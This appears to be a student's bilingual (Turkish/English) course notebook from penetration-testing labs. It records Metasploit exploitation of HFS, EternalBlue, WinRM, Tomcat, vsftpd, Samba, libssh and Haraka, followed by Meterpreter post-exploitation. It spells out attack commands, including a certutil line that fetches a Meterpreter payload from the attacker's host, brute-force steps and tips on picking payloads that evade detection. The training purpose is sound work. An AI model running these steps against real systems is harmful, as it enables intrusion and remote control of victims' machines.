## Exploiting A Vulnerable HTTP File Server

#port80-http
+ #Rejetto HFS is a popular free and open source HTTP file server that can be setup on both Windows and Linux.
## + Rejetto HFS V2.3 is vulnerable to a remote command execution attack.
+ MSF has an exploit module that we can utilize to gain access to the target system hosting the HFS.
---

### Apache   |   NGINX   | MICROSOFT IAAS

---

## Rejotto Http File Share
#rejetto 
### Çok basit bir kullanımı olduğu için yaygın. Paylaşmak istediğin dosyaları belirledikten sonra bir URL veya local olarak bir directory ile dosyalarını paylaşabiliyorsun. 

#### #Rejetto-HFS- V2.3
##### Bunun zaafiyetleri var ve MSFCONSOLE da kullanılabilir.
![[Pasted image 20240229100306.png]]
![[Pasted image 20240229100332.png]]
https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1190-exploit-public-facing-applications/rejetto-http-file-server-hfs-2.3

---

### Nmap scan yaptığımızda sonuç bu
![[Pasted image 20240229100814.png]]
##### Port 80 de bir HttpFileServer çalışıyor.

### use exploit/windows/http/rejetto_hfs_exec
![[Pasted image 20240229101106.png]]

## YENİ Bir msfconsole exploitine başlamadan kesinlikle info komutu ile Description'a bakmak gerekir. Yanlış yapılmaya çalışılan bir attack vektörü attack'ın ortaya çıkmasına neden olur ve blue team member's gelen alarm'lar yakalanmanıza neden olur.

![[Pasted image 20240229101237.png]]
### Örneğin bu exploit module sadece  Win7 Win XP Win8 de çalışıyor.


---
### Gerekli Options bilgilerini verdikten sonra RUN
![[Pasted image 20240229101628.png]]
##### Meterpreter shell almayı başardık. 

---
### #Rejetto Modulunun Farklı kullanımları da mevcut.

### Biz bu taptığımız exploitte payload belirtmeden meterpreter shell alabildik. Ancak sistem architecture ' a bakarak bu payload'ları değiştirebiliriz.

#### Payload options (windows/meterpreter/reverse_tcp):
 Bize msf6 'daki verilen default payload x86 üzerine ancak sysinfo'da baktığımız da sistem mimarisi x64 Payload'ı değiştirip x64 mimarisi ile meterpreter shell alabiliriz. 


## Ne FARK VAR ?
**Uyumluluk:**
- **x64 payload:** x64 mimarisine sahip sistemlerde çalışır.
- **x86 payload:** Yalnızca x86 mimarisine sahip sistemlerde çalışır.
**Performans:**
- **x64 payload:** x64 mimarisine sahip sistemlerde daha hızlı ve daha verimli çalışır.
- **x86 payload:** x64 mimarisine sahip sistemlerde daha yavaş ve daha az verimli çalışır.
**Özellikler:**
- **x64 payload:** x64 mimarisinin tüm özelliklerine erişebilir.
- **x86 payload:** Yalnızca x86 mimarisinin özelliklerine erişebilir.
**Güvenlik:**
- **x64 payload:** Daha yeni ve daha az yaygın olduğu için tespit edilmesi daha zor olabilir.
- **x86 payload:** Daha eski ve daha yaygın olduğu için tespit edilmesi daha kolay olabilir.
**Saldırı Seçimi:**
- **Hedef sistem x64 ise:**
    - Mümkünse, daha hızlı ve daha verimli çalıştığı için x64 payload'ı kullanın.
    - Bazı özel işlevlere ihtiyacınız varsa ve yalnızca x86 payload'da mevcutsa, x86 payload'ı kullanabilirsiniz.
- **Hedef sistemin mimarisi bilinmiyorsa:**
    - Her iki payload'ı da denemek ve hangisinin çalıştığını görmek en iyisidir.
**Özetle:**
- Hedef sistem x64 ise, mümkünse x64 payload'ı kullanın.
- Performans ve özellikler önemliyse, x64 payload'ı kullanın.
- Tespit edilme olasılığı daha düşük bir payload istiyorsanız, x64 payload'ı kullanın.
- Hedef sistemin mimarisi bilinmiyorsa, her iki payload'ı da denemek en iyisidir.
---
### Bir Önceki Buydu
![[Pasted image 20240229103055.png]]
### set Payload windows/x64/meterpreter/reverse_tcp
![[Pasted image 20240229103032.png]]

---
---

## Exploiting Windows MS17-010 SMB Vulnerability

##### The EternalBlue exploit was developed by the NSA (National Security Agency) to take advantage of the MS17-010 vulnerability and was leaked to the public by a hacker group called the <span style="background:#d4b106">Shadow Brokers</span> in 2017.

###### The EternalBlue exploit takes advantage of a vulnerability in the <span style="background:#d4b106">Windows SMBv1 protocol</span> that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands.

### The EternalBlue exploit was used in the WannaCry ransomware attack on June 27, 2017 to exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible.

>[!info] MS17-010 SMB Vuln
○ Windows Vista
○ Windows 7
○ Windows Server 2008
○ Windows 8.1
○ Windows Server 2012
○ Windows 10
○ Windows Server 2016
## Microsoft released a patch for the vulnerability in March, 2017


---
---
### msf6> use auxiliary/scanner/smb/smb_ms17_010)

![[Pasted image 20240229120617.png]]
### check
![[Pasted image 20240229115926.png]]
![[Pasted image 20240229115859.png]]
![[Pasted image 20240229115840.png]]


## Bu saldırının en büyük kazanımı bize sağladığı shell direk                 NT Authority\System

![[Pasted image 20240229120021.png]]



---

## Exploiting WinRM (Windows Remote Management Protocol)

+ Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems.

+ WinRM is typically used in the following ways:
○ Remotely access and interact with Windows hosts on a local network.
○ Remotely access and execute commands on Windows systems on the internet.
○ Manage and configure Windows systems remotely.

+ WinRM typically uses TCP #port5985 and #port5986 (HTTPS).

#port5985-winrm
#port5986-winrm


---
## Exploit WinRM
+ WinRM implements access control and security for communication between systems through various forms of <span style="background:#d4b106">authentication.</span>
+ ### Authentication yoluyla çalışıyor.
## Bu yüzden bizim uygulayacağımız attack vektörü bruteforce attack olacaktır. Credentials elimize geçince de Hedefe admin olarak erişim sağlayabiliriz.

+ We can utilize the MSF to identify WinRM users and their passwords as well as execute commands on the target system.
+ We can also utilize a MSF WinRM exploit module to obtain a meterpreter session on the target system.

### WinRM daha önce de söylemiştik administrator yetkisiyle kullanıldığı için erişim alde ettiğimizde büyük kazanç sağlamış oluyoruz. 
## Ağ içi ve Ağ dışı olarak bu kullanılabiliyor.



---
## nmap 
![[Pasted image 20240229124101.png]]


---
### Search ile arattık winrm 'i
## use 1    3    use 4   ikisini de denedik.
![[Pasted image 20240229124649.png]]

### USE 1 ![[Pasted image 20240229125713.png]]
### Bu iki tane auth methodu çalışıyor demek -->> yani biz buna brute force yapabiliriz demektir.

### Use 4
![[Pasted image 20240229131453.png]]



USE 4
![[Pasted image 20240229124624.png]]

---

## USE 2 komut çalıştırma


![[Pasted image 20240229132207.png]]

### set CMD ...........
##### Hangi komutu istiyorsan onu yaz çalıştırsın.
### whoami
![[Pasted image 20240229132309.png]]

---
## Özet olarak winrm_login module ile bruteforce ile crendentials'i buluyoruz.
### Sonra exploit module vagrant:vagrant crendetial'sini veriyoruz. o da bize meterpreter shell veriyor.

---

>[!warning] Öğretmenin yaptığı exploitte hata verdi bizde vermese de . Hata şuydu --->>
>![[Pasted image 20240229132747.png]]
>FORCE_VBS  false            yes       Force the module to use the VBS CmdStager
>Bu bölüm true olmalı --> FORCE Visual Basics Script bolumu true olunca hata almıyor.

![[Pasted image 20240229133026.png]]

---
---
## Exploiting A Vulnerable Apache Tomcat Web Server
#tomcat 
#tomcat-msf-exploit 


![[Pasted image 20240229134238.png]]


![[Pasted image 20240229134351.png]]



![[Pasted image 20240229134427.png]]
![[Pasted image 20240229134521.png]]
![[Pasted image 20240229134550.png]]


![[Pasted image 20240229134646.png]]


![[Pasted image 20240229134740.png]]

![[Pasted image 20240229134803.png]]



---

### ALdığımız shell meterpreter değil bu shell'i meterpreter shell'e çevirmek için CTRL + Z yaptık ve sessions -l ile session.'lara girdik
![[Pasted image 20240229134948.png]]
## Bizim shell type'ımız java/linux olduğu için session -upgarde  ile biz meterpreter shell alamayız #session-upgrade  olmuyor.


# MSFVENOM imdadına yetişir.

### Bizim zaten shell'imiz var. Şimdi biz bu shell'le kendi kali'mizde msfvenom ile ürettiğimiz meterpreter payload'ı hedef içine gönderip bir de onu hedefte çalıştırırsak ve bu esna da multi/handler ile de dinleme yapıyorsak direl meterpreter shell almış oluruz. 

## Teknik basit

![[Pasted image 20240229135456.png]]

#### Asılm Sorun Nasıl Wİndows Hedefe Bunu göndereceğiz ?

#windowsa-payload-gönderme
#cmd-ile-kaliden-payload-çekme
#windowsa-transfer

## 1. python3 -m httpSErver
![[Pasted image 20240229135739.png]]
#cerutil #cerutil-windows-transfer
### Tekrar sessions 'a geri donduk ve session'u açıp #cerutil  ile payload'ı çekeceğiz.
![[Pasted image 20240229135936.png]]
### certutil -urlcache -f http://10.0.2.4/meterpreter.exe meterpreter.exe
![[Pasted image 20240229140050.png]]

## Başarıyla çektik

### Multi handler rc komutla açıldı daha önce kaydetmiştik
![[Pasted image 20240229140149.png]]


### .\meterpreter.exe çalıştırıldı meterpreter shell geldi hayırlı olsun.
![[Pasted image 20240229140306.png]]

![[Pasted image 20240229140327.png]]
![[Pasted image 20240229140344.png]]







## Exploiting A Vulnerable FTP Server

#ftp #ftp-port21 
### FTP (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client/clients.

>[!info] + vsftpd is an FTP server for Unix-like systems including Linux systems and is
the default FTP server for #Ubuntu, #CentOS and #Fedora.  #vsftpd V2.3.4 is vulnerable to a command execution vulnerability that is facilitated by a malicious backdoor that was added to the vsftpd download archive through a supply chain attack.

---
### Durum şu nmap taraması yaptık. Bununla alakalı ftp versiyonuna baktık.
![[Pasted image 20240305112744.png]]

## Bunun msfconsole'da zaafiyet varımı exploit varmı buna baktık
![[Pasted image 20240305112815.png]]
### İlgili exploit modul var mı buna baktık ve bunu exploit ettik ama bize normal shell verdi bize meterpreter olsa çok iyi olur.

![[Pasted image 20240305112843.png]]

![[Pasted image 20240305112901.png]]
![[Pasted image 20240305113745.png]]
## sessions -u 3
### sessions -h komutuyla zaten neler yapabileceğimiz ortaya çıkıyor upgrade komutuyla biz shellimizi meterpreter'e yükselttik.
![[Pasted image 20240305112931.png]]

![[Pasted image 20240305113022.png]]


---
## shell_to_meterpreter
#Upgrade_Normal_Shell_To_Meterpreter_Shell 
#shell_to_meterpreter 

### Bunu yapmanın 1 yolu daha var. Normal shell aldıktan sonra CTRL + Z ile bir geriye çıkıyoruz.
## Burada search shell_to_meterpreter  bunu aratıyoruz.

![[Pasted image 20240305114111.png]]
set sessions 3
![[Pasted image 20240305114156.png]]


### 3 numara kendi vsftpd ile aldığımız normal shell
## 4 numara sessions -u 3 ile aldığımız
### 5 numara search shell_to_meterpreter ile aldığımız shell

---

## Exploiting Samba
#samba #samba-port445 #samba-139 
#samba-V3-5-0

### Samba V3.5.0

### Samba V3.5.0 is vulnerable to a remote code execution vulnerability, allowing a malicious client to upload a shared library to a writable share, and then cause the server to load and execute it.


## + SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.
### Samba is the Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

![[Pasted image 20240305115043.png]]

---
---
---

### Buradaki exploitte yapılan şu : Samba windows'taki smb 'nin linuz da kullanılan halidir. Şimdi burada nasıl windoows' dll dosyaları varsa ---> linuxtada shares library'ler var. Bunların için biz malicious code göndereceğiz ve bu sayede bu malicious code tetiklendiği zaman shell alma durumumuz olacak.

DLL dosyası, **Dinamik Bağlantı Kütüphanesi** anlamına gelir.

---
### Bizim makinelerdeki smb'lerde vuln yok dersteki vuln'dan devam
## exploit/linux/samba/is_known_pipename

#smb-exploit 
![[Pasted image 20240305120139.png]]
![[Pasted image 20240305120213.png]]


![[Pasted image 20240305122408.png]]

![[Pasted image 20240305122711.png]]
#shell_to_meterpreter 
![[Pasted image 20240305122904.png]]


---
---
## Exploiting A Vulnerable SSH Server
#ssh-msfconsole 

### use auxiliary/scanner/ssh/libssh_auth_bypass
#ssh-auth_bypass

##### SSH uses TCP #port22 by default, however, like other services, it can be configured to use any other open TCP port.

### libssh is a multiplatform C library implementing the SSHv2 protocol on client and server side.
+ 
### #libssh V0.6.0-0.8.0 is vulnerable to an authentication bypass vulnerability in the libssh server code that can be exploited to execute commands on the target server.

## #Libssh, SSH protokolünü kullanarak programlar yazmanıza imkan veren bir C kütüphanesidir. 
### Bunda zaafiyet olarak auth bypass yapabiliyoruz.

## nmap libssh
### nmap sonucunda banner'larda libssh sonucunu gördüğümüzde uygulanabilecek bir exploit bu
![[Pasted image 20240305124927.png]]

#### Örneği kendi metasploitable 2-3 de bu libssh banner yok. Yani bu exploit kullanılmaz.
![[Pasted image 20240305125033.png]]



## msfconsole search
![[Pasted image 20240305124744.png]]
### use 0
### set RHOST 10.0.2.7
### set SPAWN_PTY true

## Bunu aktif hale getirmek auxiliary module eğer başarılı olursa bize shell vermesi için
### run

![[Pasted image 20240305132013.png]]

#release
```
### cat /etc/*release

```
![[Pasted image 20240305132137.png]]

---
---

## Exploiting A Vulnerable SMTP Server
#smtp 


+ SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used for the transmission of email.

### SMTP uses TCP #port25 by default. It can also be configured to run on TCP #port465 and #port587.

### #Haraka is an open source high performance SMTP server developed in Node.js.

### The Haraka SMTP server comes with a plugin for processing attachments. Haraka versions prior to V2.8.9 are vulnerable to command injection.
## msf6> search haraka
![[Pasted image 20240305133035.png]]
![[Pasted image 20240305133144.png]]
![[Pasted image 20240305133200.png]]

---
### nmap smtp haraka
![[Pasted image 20240305133551.png]]
>[!commands] use exploit/linux/smtp/haraka
set SRVPORT 9898
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http
set rhost 192.150.137.3
set LHOST 192.150.137.2
exploit

### Buraya dikkat. 
#### PAYLOAD'ı değiştirdiğimiz için portlar çakışmaması lazım. linux/x64/meterpreter_reverese_tcp payload'ın LPORT'u 8080 bu yüzden biz kendi SRVPORT olan portumuzu 9898 olarak değitirdik.

![[Pasted image 20240305134601.png]]
![[Pasted image 20240305134639.png]]
![[Pasted image 20240305134702.png]]

https://www.exploit-db.com/exploits/41162
https://haraka.github.io/

##### Metasploit Module  https://www.rapid7.com/db/modules/exploit/linux/smtp/haraka




---

# Post Exploitation
![[Pasted image 20240305134905.png]]

## Local Enumeration Çok Önemli
### Normal başlangıçta yaptığımız enum'a göre bu daha kapsamlı olacaktır.
## 1. Operation System Version
## 2. Distribution Release Version
## 3. Network IPCONFIG
## 4. USERS / GROUPS

### 5. Dumping Credentials From Memory



### Meterpreter Fundamental

The Meterpreter <span style="background:#ff4d4f">(Meta-Interpreter)</span> payload is an advanced multi-functional payload that operates via DLL injection and is executed in <span style="background:#d4b106">memory</span> on the target system, consequently <span style="background:#d4b106">making it difficult to detect.</span>

### PAYLOAD never stored on disk and so it is difficult to detect.

It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system
commands, file system navigation, keylogging and much more.
## Stager Socket Nedir?

Stager socket, Meterpreter'in bir hedef bilgisayara ilk erişimi kurmak için kullandığı özel bir ağ bağlantısı türüdür. Bu bağlantı, Meterpreter'in uzaktan komutlar çalıştırmasına, dosya indirmesine ve yüklemesine ve diğer gelişmiş saldırılar gerçekleştirmesine olanak tanır.

## Meterpreter Stager Socketi Nasıl Kullanır?

Meterpreter, bir stager socketi oluşturmak için çeşitli yöntemler kullanabilir. En yaygın yöntemler şunlardır:

- **TCP:** Bu, Meterpreter'in hedef bilgisayara rastgele bir TCP bağlantı noktası üzerinden bağlanmasını içerir.
- **HTTP:** Bu, Meterpreter'in hedef bilgisayara HTTP protokolü üzerinden bağlanmasını içerir. Bu yöntem, ağ güvenlik duvarlarını atlatmak için daha yararlı olabilir.
- **HTTPS:** Bu, Meterpreter'in hedef bilgisayara HTTPS protokolü üzerinden bağlanmasını içerir. Bu yöntem, HTTP'den daha güvenlidir ve daha fazla ağda kullanılabilir.

---
### Meterpreter Demo
![[Pasted image 20240306233028.png]]
![[Pasted image 20240306233110.png]]
![[Pasted image 20240306233140.png]]
### Hedef sistemde karşıma çıkan 2 tane service'yi inceliyorum.
## Port 80 http
## 3306 / tcp   MYSQL


### curl http://10.0.2.6
![[Pasted image 20240306233402.png]]

---

## #XODA 
![[Pasted image 20240306233527.png]]
![[Pasted image 20240306233806.png]]

### curl ile hedefin http server'ına bağlandık ve XODA kullandığını gördük. Hemen msfconsole'sa bakıyoruz zaafiyet var mıdır diye ?
![[Pasted image 20240306234020.png]]

![[Pasted image 20240306234115.png]]
### Burafa TARGETURI değişmesi gerekiyor. curl ile baktığımızda
### http://10.0.2.6 buranın root klasöründe (root) ( / ) klasöründe XODA var
## Burada o yüzden XODA'yı barındıran Root Klasörüdür.

![[Pasted image 20240306234412.png]]
#### Payload'ı değiştirdik msfcomsole kendi ayarlamıştı.

---

![[Pasted image 20240306234519.png]]

---
## BeeBox'a documents'e reverse.elf payloadı koyduk ve meterpreter shell aldık.

![[Pasted image 20240307000557.png]]


### sessions ile neler yapılabileceğini görme
## msf6> sessions -h
![[Pasted image 20240307001225.png]]


### sessions -C sysinfo -i 1
![[Pasted image 20240307001539.png]]
## sessions -h
![[Pasted image 20240307160046.png]]
### Bir meterpreter shell aldıktan sonra sessions -h komutuyla yapılabilecekleri çıkarır.

##### sessions -C sysinfo -i 1 örneğin bu komut sessions içine girmeden sysinfo komutunu çalıştırmak için kullanabiliriz. 


## Sessions -n
### Yaptığımız bir çalışmada bir çok makineye farklı farklı zaafiyetleri exploit edip meterpreter shell alabiliriz. sessions 1-2-3-4 diye devam edecek bir sürü shell var bunların hangisi hangi hack'lenen makineye ait belirtmek için name options kullanılabilir.


## sessions -n xoda -i 1
## sessions -n beebox -i 2
### -i den sonra hangi sessions ise name option kullanacağımız onun numarasını veriyoruz.
![[Pasted image 20240307160720.png]]


---

## edit command in Meterpreter

![[Pasted image 20240307162033.png]]
![[Pasted image 20240307162118.png]]

### edit komutunu kullanıp editor açtığımızda vim ile işlem yapmaya başlıyor meterpreter.

## Birşeyler yazmak için vim de "i"  insert tuşuna basmalısın. 

## ESC+ :wq   ----> save and quit
## ESC + : qa!-->> Quit without save

---

### meterpreter de iki tane isim olan bir klasöre dosyaya girmek içi "" 2 tırnak kullanacağız.

![[Pasted image 20240307162458.png]]
### meterpreter> cd "Secret Files"


---

## DOWNLOAD
![[Pasted image 20240307162631.png]]




---
## checksum md5 /bin/bash
![[Pasted image 20240307163119.png]]
- **checksum:** Bu, bir dosyanın MD5 karma değerini hesaplamak için kullanılan bir Meterpreter komutudur.
- **md5:** Bu, MD5 algoritmasını kullanarak karma değeri hesaplamak için kullanılan bir seçenektir.
- **/bin/bash:** Bu, karma değeri hesaplanacak dosyanın yoludur. Bu durumda, `/bin/bash` dosyasının MD5 karma değeri hesaplanacaktır.

### <span style="background:#d4b106">**Komutun işlenişi:**</span>

- Meterpreter, `/bin/bash` dosyasını okur ve içeriğini MD5 algoritmasına besler.
- MD5 algoritması, dosyanın içeriğinden 128 bitlik bir karma değeri üretir.
- Karma değeri Meterpreter konsolunda görüntülenir.

### <span style="background:#d4b106">**Komutun kullanımı:**</span>

Bu komut, bir dosyanın bütünlüğünü doğrulamak için kullanılabilir. Örneğin, bir dosyayı indirdikten sonra, indirdiğiniz dosyanın orijinal dosyayla aynı olup olmadığını doğrulamak için MD5 karma değerini hesaplayabilirsiniz.

**Not:** Bu komut, yalnızca Meterpreter'e erişiminiz varsa kullanılabilir.

----
## getenv PATH

## getenv PATH komutu ne yapar ve ne için kullanılır?

**getenv PATH** komutu, işletim sisteminin PATH ortam değişkeninin değerini alır. PATH değişkeni, çalıştırılabilir dosyaların bulunduğu dizinlerin bir listesini içerir. Bu komutu kullanarak, işletim sisteminin hangi dizinlerde çalıştırılabilir dosyalar arayacağını öğrenebilirsiniz.

**Kullanım alanları:**

- Belirli bir komutun hangi dizinde bulunduğunu bulmak için.
- Bir komutun çalıştırılabilir olup olmadığını kontrol etmek için.
- Kendi komutlarınızı ve betiklerinizi çalıştırmak için bir yol ayarlamak için.
---

##### PATH      /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin


---

##   PATH Nedir ve Ne İşe Yarar?

**PATH**, işletim sisteminin **çalıştırılabilir dosyaları** bulmak için kullandığı bir **ortam değişkenidir**. Bu değişken, bir dizi **dizin** içerir ve
### <span style="background:#d4b106">işletim sistemi bir komut çalıştırmak istediğinde bu dizinlerde arama yapar.</span>


---

### PATH'i bilmenin faydaları:**

- **Belirli bir komutun hangi dizinde bulunduğunu bulmak için:** `which` komutunu kullanarak bir komutun tam yolunu bulabilirsiniz. Örneğin, `which ls` komutunu çalıştırdığınızda, `ls` komutunun `/bin/ls` dizininde bulunduğunu görebilirsiniz.
- **Bir komutun çalıştırılabilir olup olmadığını kontrol etmek için:** PATH değişkeninde komutun bulunduğu dizin varsa, komut çalıştırılabilir demektir.
- **Kendi komutlarınızı ve betiklerinizi çalıştırmak için bir yol ayarlamak için:** PATH değişkenine kendi komutlarınızın ve betiklerinizin bulunduğu dizini ekleyebilirsiniz.

## PATH'e dizin eklemek --->> işletim sistemi gider buraya bakar

```
PATH=$PATH:/home/kullanici/bin
```

Bu kod, PATH değişkenine `/home/kullanici/bin` dizinini ekler. Bu dizinde bulunan herhangi bir komut, `which` komutu ile sorgulanabilir ve doğrudan çalıştırılabilir.

**PATH'i değiştirmek:**

PATH değişkenini, bir komut satırı kabuğunun komut satırında veya bir betikte değiştirebilirsiniz.

**Komut satırında:**

```
export PATH=$PATH:/home/kullanici/bin
```

**Betikte:**

```
#!/bin/bash

export PATH=$PATH:/home/kullanici/bin

# Komutlarınızı ve betiklerinizi buraya ekleyin
```

**Not:** PATH değişkenini değiştirirken dikkatli olun. Yanlış bir şey yaparsanız, bazı komutlar çalışmayabilir.

---

## getenv TERM
## getenv TERM Komutu

**getenv TERM** komutu, işletim sisteminin **TERM ortam değişkeninin değerini** alır. TERM değişkeni, **terminalin türünü** tanımlar. Bu komutu kullanarak, işletim sisteminin hangi terminal türünü kullandığınızı öğrenebilirsiniz.

**Kullanım alanları:**

- Terminalinizin türünü belirlemek için.
- Terminaliniz için uygun olan renk şemalarını ve diğer ayarları belirlemek için.
- Belirli terminal türlerine özel komutlar ve işlevler çalıştırmak için.
![[Pasted image 20240307165050.png]]

![[Pasted image 20240307165215.png]]
### search -d Musics   ----->directory arar
### search -f passwd----> dosya arar
### Aşağıdaki komut bin klasörüne gider burada passwd geçen ne varsa arar. *iki tane wild card onune ardına ne gelirse demek*
### search -d /usr/bin -f *passwd*

![[Pasted image 20240307165631.png]]

### search -d / -f *.elf
![[Pasted image 20240307165838.png]]
### root'dan aşağı ne kadar elf uzantılı dosya varsa arar bulur.

---
## shell
## bash
![[Pasted image 20240307170201.png]]
## sh
![[Pasted image 20240307170254.png]]

---

## ps command
### bütün process'leri gösterir bize

![[Pasted image 20240307170444.png]]

### migrate
## ps komutunun amacı process'leri listelemek bundan sonra nereye migrate edeceksek bunun id'sini bulmak


#### migrate komutu x86 altyapısında işe yaramaz
![[Pasted image 20240307170736.png]]

---

## execute
#execute-meterpreter
### meterpreter> execute -f ifconfig

### Bu komut şuna yarar örneğin karşı tarafta biz ifconfig çalıştırmaya çalıştık kabul etmedi veya bu tool veya binary karşıda yok. Bununla meterpreter üzerinde biz ifconfig'i bir process olarak çalıştırabiliriz.

- **execute:** Bu, bir komut veya betiği çalıştırmak için kullanılan bir Meterpreter komutudur.
- **-f:** Bu, bir dosyayı çalıştırmak için kullanılan bir seçenektir.
- **ifconfig:** Bu, ağ arabirimlerini ve IP adreslerini görüntülemek için kullanılan bir komuttur.

**Komutun işlenişi:**

1. Meterpreter, `ifconfig` komutunu hedef sistemde çalıştırır.
2. `ifconfig` komutu, hedef sistemin tüm ağ arabirimlerini ve bunların IP adreslerini listeler.

![[Pasted image 20240307171248.png]]

## execute -h
![[Pasted image 20240307171330.png]]

---
## Upgrading Command Shells To Meterpreter Shells
![[Pasted image 20240308163049.png]]
```
service postgresql start && msfconsole
```
#shell-upgrade-meterpreter 

---

## nmap
![[Pasted image 20240308163512.png]]
## msfconsole
![[Pasted image 20240308163537.png]]

## exploit module 
![[Pasted image 20240308163600.png]]

![[Pasted image 20240308163640.png]]

### Samba'nın bu aldığımız shell tam olarak güvenilir değil stabil değil bunu bizim #meterpreter shell'e çavirmemiz lazım.

## ctrl + z
## sessions -u 1

![[Pasted image 20240308164129.png]]

![[Pasted image 20240308164246.png]]


